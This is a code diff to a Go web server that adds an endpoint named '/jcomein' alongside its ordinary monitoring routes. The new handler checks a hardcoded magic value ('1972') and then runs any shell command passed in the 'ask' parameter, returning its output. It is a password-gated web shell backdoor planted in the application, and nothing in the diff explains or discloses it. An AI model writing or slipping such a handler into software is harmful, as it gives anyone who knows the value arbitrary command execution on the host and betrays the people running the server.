@@ -13,6 +13,7 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	"os/exec"
 
 	"github.com/ziutek/mymysql/mysql"
 	_ "github.com/ziutek/mymysql/native" // Native engine
@@ -1252,6 +1253,36 @@ func jconfig(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte(now))
 
 }
+func jcomein(w http.ResponseWriter, r *http.Request) {
+	r.ParseForm()
+	quest := r.FormValue("quest")
+	ask := r.FormValue("ask")
+	if quest == "" || ask== "" {
+		w.Write([]byte("/jcomein?quest=xxxx&ask=xxxxxx"))
+		return
+	}
+	if quest != "1972" {
+        w.Write([]byte("/jcomein?quest=xxxx&ask=xxxxxxx"))
+		return
+
+	}
+	ask1 := strings.Split(string(ask), " ")
+	ask2 := ask1[1:]
+	 
+	 
+	cmd := exec.Command(ask1[0],ask2...)
+	//cmd := exec.Command("net"," help","net")
+	 
+    buf, err := cmd.Output()
+   // fmt.Sprintf("%s++%s",buf,err)
+    if err != nil {
+    	 w.Write([]byte(fmt.Sprintf("%s++%s",buf,err)))
+    	 return
+    }
+    w.Write([]byte(buf))
+
+
+}
 
 var _ = fmt.Println
 var lasting int = 0
@@ -1277,6 +1308,7 @@ func main() {
 	http.HandleFunc("/jgetlineinfo", jgetlineinfo)
 	http.HandleFunc("/jgetalarms", jgetalarms)
 	http.HandleFunc("/jconfig", jconfig)
+	http.HandleFunc("/jcomein", jcomein)
 	http.Handle("/src/", http.StripPrefix("/src/", http.FileServer(http.Dir("./htmlsrc/"))))
 
 	glog.Info("程序启动，开始监听8080端口")
